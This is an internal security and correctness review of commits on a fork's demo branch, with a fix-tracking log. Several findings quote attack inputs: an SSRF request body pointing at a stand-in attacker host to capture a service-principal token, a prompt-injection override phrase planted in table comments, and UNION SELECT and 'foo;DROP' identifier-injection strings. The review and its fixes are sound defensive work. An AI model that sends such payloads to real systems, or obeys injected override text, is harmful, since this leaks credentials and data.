# DAIS branch critical review

**Reviewed:** 2026-05-28
**Scope:** 27 of Alan's commits on `dais` vs `main` (filtered from 232 total to exclude upstream + docs/plans-only).
**Method:** One code-reviewer agent per commit. Per-commit reports live in `/tmp/dais-review/<sha>.md`.

## Headline

**One demo-content showstopper, one architectural bug that silently breaks federated quality, and a cluster of unauthenticated/over-privileged endpoints that should be tightened before the DAIS deploy.**

The good news: the deploy infrastructure is largely sound — `e3843c98`, `7729d40d`, `d5a65593` have real findings but are workable. Frontend/config commits are clean.

---

## DEMO-CRITICAL (must fix before 2026-05-31)

### 1. Custom aviation quality rules never run [`848d2e2d`]
**File:** `src/backend/src/data/aviation/definitions.py:209-235, 342-386`
**Issue:** `_qrule()` entries (`delay_minutes_range`, `delays_only_positive`, `ooooi_ordering`, etc.) are emitted under the contract's top-level `qualityRules` key. DQX's `_generate_rules_from_odcs_schemas` only iterates `odcs.schema_` — it never reaches top-level `qualityRules`. **All the domain-specific aviation rules the demo showcases are silently dropped before DQX even sees them.** The 99.58% pass rate is entirely from DQX's auto-generated structural rules.
**Why it matters:** The "federated quality with custom domain rules" angle of the demo doesn't actually fire. Boeing will be watching this.
**Fix:** Move `_qrule()` entries into each schema's `quality:` list inside `_schema_entry()`, change `type` to `"custom"`, `engine` to `"dqx"`, wrap in a DQX `implementation: {check: ...}` dict. ~30 minutes once the shape is right.

### 2. DQX 422 on pre-existing draft contracts [`8cace6c2`, `564df92b`]
**File:** `src/backend/src/routes/data_contracts_routes.py:2030-2034`
**Issue:** New schema-presence guard raises 422 for any contract with no `SchemaObjectDb` rows. Any contract authored through the UI before `564df92b` (which changed the contract shape) hits this on "Run DQX" click — surfaces as a destructive red toast.
**Why it matters:** If the demo workspace has any pre-existing draft contracts, the live demo will fail in the worst possible way.
**Fix:** Either (a) wipe and re-seed before the demo to guarantee no legacy contracts, or (b) disable the "Run DQX" button in `data-contract-details.tsx` when `contract.schema_objects?.length === 0`.

### 3. Live HTTP fetch during seed [`b66cd41f`]
**File:** `src/backend/src/data/aviation/airports.py`
**Issue:** `urllib.request.urlopen('https://davidmegginson.github.io/...')` during demo seed. Conference wifi or workspace egress policy will kill it at the worst time.
**Why it matters:** A single transient network failure between "click Seed" and the stage demo = no airports = no demo.
**Fix:** Pre-fetch once, commit a Parquet/CSV snapshot to the repo, load from disk.

---

## SECURITY — CRITICAL

### 4. SSRF via `ontos_base_url` in DQX run body [`cffd19be`, surfaced again by `e3843c98`]
**File:** `src/backend/src/routes/data_contracts_routes.py:1993-2002` + `src/backend/src/workflows/dqx_contract_validation/dqx_contract_validation.py:232`
**Issue:** `DqxRunBody.ontos_base_url` is `Optional[str]` with no validator. Any `READ_WRITE`-on-`data-contracts` user can POST `{"ontos_base_url": "https://attacker.com"}`. The job (a) GETs the contract from attacker.com and (b) POSTs quality metrics back **with a live M2M bearer token for the Apps SP** (printed to job logs, readable by anyone with Jobs view).
**Why it matters:** Authenticated-but-not-admin user → SP token exfil.
**Fix:** Delete the field. The only legitimate source is server-side `settings.ONTOS_PUBLIC_URL`.

### 5. Contract generator endpoint has no auth [`33c48fdd`]
**File:** `src/backend/src/routes/contract_generator_routes.py`
**Issue:** Both `POST /api/contract-generator/preview` and `POST /api/contract-generator/generate` have **zero** auth dependencies. Any authenticated Databricks App user (including Data Consumers) can trigger LLM calls + warehouse queries against any table they can name.
**Why it matters:** Cost amplification + info disclosure (LLM output reveals column-level info on tables the caller may not have direct UC SELECT on, because the SP makes the LLM call).
**Fix:** Add `Depends(PermissionChecker('data-contracts', FeatureAccessLevel.READ_WRITE))` to both handlers.

### 6. Prompt injection from UC table comments [`33c48fdd`]
**File:** `src/backend/src/controller/contract_generator_manager.py:204-232`
**Issue:** Table and column comments are concatenated verbatim into the LLM user prompt. A UC table owner can write `"Ignore previous instructions and..."` in a column comment and it gets followed.
**Why it matters:** Persisted attacker-controlled certification levels, PII flags, or quality rules.
**Fix:** Truncate/sanitize comments before templating, or encode as a JSON block to make the injection boundary explicit.

### 7. SP privilege escalation in `GenerateContractFromTableTool` [`43ff68c8`]
**File:** `src/backend/src/controller/contract_generator_manager.py:126` and tool registration
**Issue:** Tool constructs `ContractGeneratorManager` without `ctx.workspace_client`. The generator falls back to `get_workspace_client(self.settings)` — the SP client. `_inspect_columns`, `_sample_rows` (200 rows!), and `_column_stats` all run as the SP.
**Why it matters:** Any Ontos user can ask the agent to introspect a UC table they have no SELECT on and get column metadata + sample rows.
**Fix:** Pass OBO token through the tool context.

### 8. SQL injection via LLM-controlled identifiers [`43ff68c8`]
**File:** `src/backend/src/controller/contract_generator_manager.py:126`
**Issue:** `f"SELECT * FROM {catalog}.{schema}.{table} LIMIT {int(n)}"` — `catalog/schema/table` are LLM function-call args. No allow-list, no quoting. Multi-statement is blocked by Databricks SQL API, but `UNION SELECT` exfil is live if the model can be prompt-injected.
**Fix:** Validate components against `^[A-Za-z0-9_]+$` or backtick-quote them.

### 9. LLM-search chat path bypasses OBO [`25a6449e`]
**File:** `src/backend/src/routes/llm_search_routes.py:90` + `src/backend/src/controller/llm_search_manager.py:551`
**Issue:** The `chat` route handler never extracts `x-forwarded-access-token` and passes `user_token=None` into `_get_openai_client()`. The new fallback at `llm_client.py:74` then uses `get_workspace_client(settings)` — the SP client — for an end-user request. Privilege escalation via SP.
**Fix:** Add the 5-line OBO extraction that `contract_generator_routes.py:34` and `ontology_generator_routes.py:46` already do.

### 10. Quality-item ingest accepts forged contract IDs [`864ad995`]
**File:** `POST /api/entities/{entity_type}/{entity_id}/quality-items`
**Issue:** No entity-existence check. Path + body `entity_id` match is the only validation. Any caller with a valid M2M token for the app SP can POST a quality score for any (real or fabricated) UUID, directly polluting the compliance score.
**Fix:** Contract-existence lookup before `manager.create()`.

### 11. UC overprovisioning in SP bootstrap [`7729d40d`]
**File:** `bootstrap-app-permissions.sh:201`
**Issue:** Step 4 grants `MODIFY` and `CREATE_SCHEMA` at the catalog scope. On the dedicated `safe_skies` catalog: acceptable. On Free Edition where `workspace` is shared: SP can write/delete tables in any schema, current or future.
**Fix:** Scope `MODIFY/SELECT/CREATE_TABLE/USE_SCHEMA` to specific schemas via a `TARGET_SCHEMAS` loop; leave only `USE_CATALOG`/`CREATE_SCHEMA` at catalog level.

### 12. `set_publication_scope` manager method is unauthenticated [`c7cf6a78`]
**File:** `src/backend/src/controller/data_products_manager.py:795`
**Issue:** New manager method has no permission check. Route handler at `data_product_routes.py:260` correctly gates with `PermissionChecker`, but the manager method is also called from the seeder and workflow executor. Plus the route has its own duplicate inline implementation — two divergent code paths.
**Fix:** Make the route call the manager method (eliminate duplication); add a docstring asserting callers own authorization for non-HTTP entry points.

### 13. Demo-data clear/load endpoints have no admin gate [`d733c4c0`, `efa61dee`]
**File:** `src/backend/src/routes/settings_routes.py` — `DELETE /api/settings/demo-data/aviation` + `POST /api/settings/demo-data/load-aviation`
**Issue:** Both use only `AuditCurrentUserDep` (auth-only, no permission). Any authenticated workspace user can wipe and re-seed mid-demo. `settings` is declared `ADMIN_ONLY_LEVELS` in `features.py`, but the gate isn't wired in.
**Fix:** `Depends(require_admin(SETTINGS_FEATURE_ID))` on both. `require_admin` already exists at `common/authorization.py:566`.

---

## CORRECTNESS — HIGH

### 14. Sanitizer bypasses reserved-keyword guard [`9f924716`]
**File:** `src/backend/src/common/unity_catalog_utils.py:159`
**Issue:** New early-return for principal-name pattern exits before the reserved-keyword set and `^[a-zA-Z_]` start-of-identifier check. `select@domain.com` and `123@domain.com` now pass. Today's callers double-quote downstream so no active injection — but the sanitizer's contract is broken; any future caller that skips quoting gets exposed.
**Fix:** Apply reserved-word check to the principal-name path too.

### 15. Unquoted `search_path` option [`9f924716`]
**File:** `src/backend/src/common/database.py:412`
**Issue:** PGSCHEMA path builds `-csearch_path={validated_schema}` without quoting. Pre-commit the regex would reject hyphens; post-commit `my-schema` passes the looser principal-name path and breaks libpq parsing.
**Fix:** Quote the value: `f'-csearch_path="{validated_schema}"'`.

### 16. Broken CI test [`9f924716`]
**File:** `src/backend/src/tests/unit/test_unity_catalog_utils.py:107-110`
**Issue:** `test_sanitize_postgres_identifier_invalid_chars` asserts `"my-database"` raises `ValueError`. It doesn't anymore. CI red on next run.
**Fix:** Update test to cover a genuinely-rejected character; add positive tests for email + SP-display-name paths.

### 17. Tags silently dropped on contract create [`17ee6efc`]
**File:** `src/backend/src/controller/data_contracts_manager.py:2367-2370`
**Issue:** `isinstance(t, str)` filter on tags. After `model_dump()`, tags are dicts (`AssignedTagCreate`), so every tag gets filtered out. The commit message says "preserve tags"; the code does the opposite.
**Fix:** Extract `t.get('tag_fqn')` from dicts, mirroring `create_from_upload`.

### 18. Owner-team N+1 on every product list [`a990daed`]
**File:** `src/backend/src/controller/data_products_manager.py:286, 2379` + `src/backend/src/repositories/data_products_repository.py`
**Issue:** `_load_product_with_tags` fires `team_repo.get` per product in a for-loop. Plus an additional lookup inside `_ensure_owner_in_team` on the write path. Two team lookups per product per call.
**Fix:** Single bulk query; drop the duplicate.

### 19. Owner-team rename never propagates [`a990daed`]
**File:** `src/backend/src/repositories/data_products_repository.py:74-77`
**Issue:** Idempotency guard short-circuits the moment any member has `role='owner'`. Rename the Ontos team → call `update()` → stale name stays on disk forever.
**Fix:** Update-or-create instead of skip-if-exists.

### 20. ODCS pull endpoints have no status gate [`32772763`]
**File:** `src/backend/src/routes/data_contracts_routes.py:1885-1936`
**Issue:** `get_with_all` and `build_odcs_from_db` have no status check. Any READ_ONLY user can pull full ODCS of `draft` / `retired` contracts by UUID. For machine-pull (DQX), systemic exposure.
**Fix:** `PUBLISHABLE_STATUSES = {"active", "approved"}` check after the 404 guard; return 404 (not 403) so callers can't enumerate by status.

### 21. Timezone comparison silently zeros compliance scores [`f387592d`]
**File:** `src/backend/src/common/compliance_entities.py`
**Issue:** `recent_cutoff` is tz-aware; `QualityItemDb.measured_at` may return tz-naive depending on driver. `naive >= aware` raises `TypeError`, caught by broad `except Exception` in `load_entities`, all contracts score 0.0 silently.
**Why it matters:** Lakebase behavior may differ from local Postgres — could be a deploy-day surprise.
**Fix:** `if measured_at.tzinfo is None: measured_at = measured_at.replace(tzinfo=timezone.utc)` before compare.

### 22. Compliance N+1 on contract iteration [`f387592d`]
**File:** Same file
**Issue:** One `QualityItemDb.first()` per contract inside the loop.
**Fix:** Single `GROUP BY entity_id, MAX(measured_at)` bulk fetch.

### 23. DQX concurrent runs corrupt quarantine [`cffd19be`]
**File:** Route handler for DQX submit
**Issue:** Two rapid clicks both succeed; both jobs append to the same `_quarantine` table; quality panel shows doubled entries.
**Fix:** In-memory `app.state.dqx_inflight` set + 409 if contract already in flight.

### 24. Recovery script: destructive operations with no dry-run [`1c7d147f`]
**File:** Recovery script (`recover-lakebase-sp-access.sh` or similar) lines ~71-75
**Issue:** Five DDL statements fire immediately after the SP UUID echo. A typo in `SP_UUID` silently grants the wrong principal full schema access.
**Fix:** `read -p "Proceed? [y/N]"` confirmation, or `DRY_RUN=1` code path.

### 25. Recovery script: `GRANT ALL PRIVILEGES` includes TRUNCATE [`7729d40d`]
**File:** `recover-lakebase-sp-access.sh:72`
**Issue:** `GRANT ALL` on Lakebase tables includes `TRUNCATE` — a buggy job could nuke Ontos metadata.
**Fix:** Tighten to `SELECT, INSERT, UPDATE, DELETE`.

### 26. Seeder transaction is fake [`efa61dee`]
**File:** `src/backend/src/controller/data_contracts_manager.py:2405`
**Issue:** `create_contract_with_relations` calls `db.commit()` internally. Route's `db.rollback()` on exception is a no-op against already-committed rows. Crash halfway through products = orphan contracts. Skeleton-detection idempotency guard misses them; re-seed shows duplicates.
**Fix:** Single transaction with one final commit at the route level. (Larger change — workaround for DAIS: document "seed once from clean DB" as a precondition.)

---

## MAINTAINABILITY / UPSTREAM-DIVERGENCE

### 27. `iam.current-user:read` and `iam.access-control:read` missing from `databricks.yaml` [`655151ae`]
**File:** `src/databricks.yaml` `user_api_scopes`
**Issue:** `manifest.yaml` declares them with a comment "load-bearing for OBO group lookups"; `databricks.yaml` omits them. The new parity script (`d5a65593`) may or may not catch this direction.
**Fix:** Add both scopes to `user_api_scopes`.

### 28. Manager-route duplicate implementations [`c7cf6a78`]
**File:** `data_product_routes.py:251-315` vs new manager method
**Issue:** Three copies of publish logic (route, new manager method, `publish_product`). `published_by` already computed differently between them. Will drift.
**Fix:** Single source in manager; route just delegates.

### 29. Repository doing manager work [`a990daed`]
**File:** `src/backend/src/repositories/data_products_repository.py`
**Issue:** `_ensure_owner_in_team` imports and calls a sibling repo + decides ODPS shape — both are manager responsibilities. Cross-repo dependency could deadlock import graph.
**Fix:** Move to `DataProductsManager`.

### 30. `hubLabel` defaults to `'Safe Skies'` in shared component [`14ef97a8`]
**File:** `DataDomainStarburstGraph`
**Issue:** DAIS demo name leaks as default. Any upstream PR will need this changed.
**Fix:** Default to `'Data Domains'` before any upstream PR.

### 31. App permissions update wipes existing ACL [`7729d40d`]
**File:** `bootstrap-app-permissions.sh:102`
**Issue:** `apps update-permissions` is set, not merge. Re-running wipes any other entries.
**Fix:** Read existing ACL, merge, then update.

### 32. Aviation contracts assume single UC schema per contract, no guard [`564df92b`]
**File:** `_contract()` in `definitions.py`
**Issue:** `servers` derived from `schemas[0]` only; no check that other schemas live in the same catalog.schema. Silent corruption if violated.
**Fix:** One assertion before building the return dict.

### 33. Retired-contract orphans on re-seed [`564df92b`]
**File:** `seed.py`
**Issue:** `seeded_names = {c["name"] for c in ALL_CONTRACTS}`. Renames in this commit dropped 4 names. On any workspace that ran the old seed, those rows never clean up.
**Fix:** `RETIRED_CONTRACT_NAMES` set deleted at top of seed loop.

### 34. Personal email hardcoded as seed default [`efa61dee`]
**File:** `src/backend/src/data/aviation/seed.py` — `load_aviation_demo(..., current_user="alan.reese@databricks.com")`
**Fix:** Default to `"demo-seeder@safe-skies.demo"`.

### 35. Free-edition workspace host is personal [`b4ef6b57`]
**File:** `src/databricks.yaml:129`
**Issue:** `dbc-1c96f9a2-7da9` is Alan's personal Free Edition workspace; can be reclaimed; clones running `-t free-edition` would hit confusing errors.
**Fix:** Comment-flag as personal, or promote to a shared FE workspace before DAIS.

---

## Progress tracker

### Wave 1 — demo-content fixes (direct-to-dais)

| # | Status | Commit | Notes |
|---|--------|--------|-------|
| Bot prompt tuning | ✓ DONE | `cfda3d17` | Codifies ontos-specific patterns: OBO vs SP, transaction boundaries, layering, DQX schema-quality |
| #3 Live HTTP fetch | ✓ DONE | `d3d0bf59` | 250 airports → committed 14KB Parquet snapshot |
| #1 Custom rules placement | ✓ DONE | `3dcb4b62` | 40 rules now DQX-runnable (was 0); 13 stay docs-only |
| #1 JSON-encode follow-up | ✓ DONE | `4aac9369` | Caught by local validation: implementation dict needed `json.dumps`/`json.loads` round-trip across the Text column |
| **Workspace validation** | ✓ DONE | run 127397288570288 | DQX log: `generated 11 rules for schema='adsb_v2'; 0 sibling-schema rules filtered out, 11 apply (6 from the contract's custom quality rules)` — 11826 pass / 24 fail / 99.80% / 24 rows quarantined |

### Wave 2 — security PRs (MERGED to dais 2026-05-28)

Reviewed locally (code-reviewer agent per PR, posted to the GitHub PR), all
review findings folded in before merge. The GitHub Action bot was removed —
local-review-posted-to-PR is now the pattern (see [[project-fork-workflow]]).

| PR | Status | Findings | Notes |
|----|--------|----------|-------|
| [#1 PR-A "Auth gates"](https://github.com/acreese11/ontos/pull/1) | ✅ MERGED | #5, #9, #10, #12, #13 | + folded: audit-on-failure in `finally`, dropped unused param |
| [#2 PR-B "SP-as-user paths"](https://github.com/acreese11/ontos/pull/2) | ✅ MERGED | #4, #6, #7, #8 | + folded the big one: **route-path OBO** (the tool-path fix missed `/preview`+`/generate`; now `get_contract_generator_manager` threads OBO). Plus ASCII ellipsis, name/type sanitize, 17 new safety tests |
| [#3 PR-C "Sanitizer + identifier safety"](https://github.com/acreese11/ontos/pull/3) | ✅ MERGED | #11, #14, #15, #16 | + folded: hoisted reserved set, extracted `is_strict_pg_identifier` shared helper, bootstrap schema-name guard, documented `my-database` relaxation. 31 sanitizer tests pass |

**Attribution (checked vs upstream `main` 2026-05-28):** 11 of 13 findings were
introduced by our own fork's DAIS feature work (contract-gen, DQX loop, sanitizer
patch, demo-data endpoints — all net-new surface). Only #9 (llm-chat OBO, structure
pre-existing; our `25a6449e` SP-fallback amplified it) and #10 (quality-item ingest,
latent on main; our DQX M2M loop made it reachable) touch upstream code.

**Upstream cherry-pick candidates:** #9 + #10 fixes harden code that exists on
`databricks labs/ontos`. Cherry-pick into clean PRs against upstream main when ready.

**Workspace validation (dais-aws, deploy 2026-05-28T22:33Z):**
- ✅ PR-C boot — app RUNNING; `search_path` strict-identifier check didn't break startup
- ✅ PR-B #4 SSRF — body `ontos_base_url:"https://attacker.example"` ignored; server returned the real app host
- ✅ PR-B #8 identifier injection — `foo;DROP` → HTTP 422 (ValueError mapped), not 500
- ✅ PR-A auth gates — endpoints respond for the authorized user (earlier 403 was a stale in-progress deploy)
- ✅ DQX federated-quality regression check — re-ran on `live_flights`: 11 rules, 6 from custom quality, 99.80%, 24 quarantined — identical to Wave 1
- ⚠️ PR-B #7 route-path OBO (`/contract-generator/preview`) — returns 500 on dais-aws. NOT a Wave 2 regression: the no-OBO code path is byte-identical pre/post the factory change (both fall back to SP via `get_obo_workspace_client`). Ruled out UC SELECT + warehouse (DQX SELECTs the same table fine) and LLM endpoint (READY, llm-search/status 200). Most likely the app SP lacks CAN_QUERY on `databricks-claude-opus-4-7`, or a contract-gen-specific bug — pre-existing (feature never smoke-tested on dais-aws). Also: true OBO-as-user can only be verified through a browser SSO session, not a PAT-bearer curl (no `x-forwarded-access-token`). Open item, separate from Wave 2.

### Wave 3 — correctness / maintainability (defer to upstream PR pile)

| # | Severity | Where |
|---|----------|-------|
| #2 422 on draft contracts | High | `data_contracts_routes.py:2030-2034` — workaround: re-seed before recording (sidesteps the trap) |
| #17 Tag-drop on contract create | High | `data_contracts_manager.py:2367-2370` |
| #18 Owner-team N+1 on product list | High | `data_products_manager.py:286, 2379` |
| #19 Owner-team rename never propagates | High | `data_products_repository.py:74-77` |
| #20 ODCS pull no status gate | High | `data_contracts_routes.py:1885-1936` |
| #21 Timezone comparison zeroes scores | High | `compliance_entities.py` |
| #22 Compliance N+1 | High | same |
| #23 DQX concurrent runs corrupt quarantine | High | route handler |
| #24 Recovery script no dry-run | High | `recover-lakebase-sp-access.sh:71-75` |
| #25 `GRANT ALL` includes TRUNCATE | High | `recover-lakebase-sp-access.sh:72` |
| #26 Seeder transaction is fake | High | `data_contracts_manager.py:2405` — workaround: seed once from clean DB |
| #27 Missing IAM scopes in databricks.yaml | Med | `src/databricks.yaml` user_api_scopes |
| #28 Manager-route duplication | Med | `data_product_routes.py:251-315` |
| #29 Repo doing manager work | Med | `data_products_repository.py` |
| #30 `'Safe Skies'` default in shared component | Med | `DataDomainStarburstGraph` |
| #31 SP bootstrap wipes ACL | Med | `bootstrap-app-permissions.sh:102` |
| #32 Single-catalog assumption no guard | Med | `definitions.py` `_contract()` |
| #33 Retired-contract orphans | Med | `seed.py` |
| #34 Personal email default in seed | Med | `seed.py` |
| #35 Personal FE workspace host | Med | `databricks.yaml:129` |

### Upstream PR candidates (post-DAIS)

Cross-reference with `memory/project_ontos_upstream_pr_candidates.md`. Items worth promoting:
- Sanitizer change [`9f924716`] — after #14 + #16 cleanup
- CI parity check for OAuth scopes [`d5a65593`] — upstream-worthy as-is
- The DQX schema-quality persistence change in `_create_schema_objects` (this PR) — depends on upstream taking the federated-quality wiring story

---

## Upstream PR readiness notes

Before opening upstream PRs to `databrickslabs/ontos`:
- Strip DAIS-demo specifics: `'Safe Skies'` default, `alan.reese@databricks.com` default, personal Free Edition workspace host.
- The sanitizer change [`9f924716`] is upstream-worthy but needs the reserved-word fix [#14] and the broken test fixed [#16] first.
- DQX wiring may not be upstream-ready until federated quality is a real upstream feature, not just our fork's demo path.
- The CI parity check for OAuth scopes [`d5a65593`] is upstream-worthy as-is.

---

*All per-commit reviews available in `/tmp/dais-review/<sha>.md`.*
